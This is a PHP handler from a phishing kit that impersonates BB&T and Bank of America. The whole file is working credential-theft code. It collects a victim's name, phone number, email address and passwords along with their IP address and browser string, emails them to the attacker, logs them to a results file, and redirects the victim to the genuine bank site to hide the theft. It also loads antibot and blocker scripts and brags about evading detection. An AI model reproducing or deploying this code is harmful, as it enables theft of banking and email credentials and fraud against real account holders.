<?php
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";
$message .= "--++-----[ $$ iNFO  $$ ]-----++--\n";
$message .= "----------BB&T  ReZulT--------------------\n";
$message .= "Full Name: ".$_POST['3']."\n";
$message .= "Phone Number: ".$_POST['4']."\n";
$message .= "----------Email--------------------\n";
$message .= "Email Address: ".$_POST['5']."\n";
$message .= "Paasword: ".$_POST['6']."\n";
$message .= "Paasword: ".$_POST['7']."\n";
$message .= "++-----[ $$ Fully Undetected by Mou AD $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Mou Ad  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "BankofAmerica [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: BankofAmerica 2 <service>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location: https://www.bankofamerica.com/online-banking/service-agreement.go");?>